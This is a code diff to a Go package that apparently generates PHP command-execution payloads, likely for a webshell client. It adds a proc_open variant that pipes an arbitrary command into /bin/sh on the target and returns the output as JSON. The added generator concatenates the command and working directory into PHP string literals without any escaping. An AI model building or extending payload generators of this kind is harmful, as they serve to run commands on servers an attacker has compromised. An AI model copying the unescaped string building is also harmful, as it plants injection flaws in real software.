@@ -2,6 +2,7 @@ package phpadapter
 
 import (
 	"bytes"
+	"fmt"
 	"io"
 	"mime/multipart"
 	"os"
@@ -18,6 +19,20 @@ func _getShellExecCMD(cmd, letter string) string {
 	return "$" + letter + "=shell_exec('" + cmd + "');"
 }
 
+func _getProcOpenCMD(cmd, scope, proc, letter string) string {
+	if scope == "" {
+		scope = "./"
+	}
+
+	o := "$opt = array(0=>array('pipe','r'),1=>array('pipe','w'),2 => array('pipe', 'w'));$scope='" + scope + "';$proc=proc_open('" + proc + "', $opt, $pipes, $scope);"
+	o += "if(is_resource($proc)){fwrite($pipes[0],'" + cmd + "');fclose($pipes[0]);$s=stream_get_contents($pipes[1]);fclose($pipes[1]);$e=stream_get_contents($pipes[2]);"
+	o += "fclose($pipes[2]);$c = proc_close($proc);$" + letter + " = array('success'=>$s,'error'=>$e,'code'=>$c);$" + letter + "=json_encode($" + letter + ");}"
+
+	fmt.Println(o)
+
+	return o
+}
+
 func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
 	var contexter, shellCMD string
 
@@ -31,6 +46,10 @@ func CreateCMD(cmd, scope, method string, response bool, opt ...string) string {
 		shellCMD = _getSystemCMD(shellCMD, "r")
 	} else if method == "shell_exec" {
 		shellCMD = _getShellExecCMD(shellCMD, "r")
+	}
+
+	if method == "proc" {
+		shellCMD = _getProcOpenCMD(cmd, scope, "/bin/sh", "r")
 	}
 
 	if response && len(opt) > 1 {
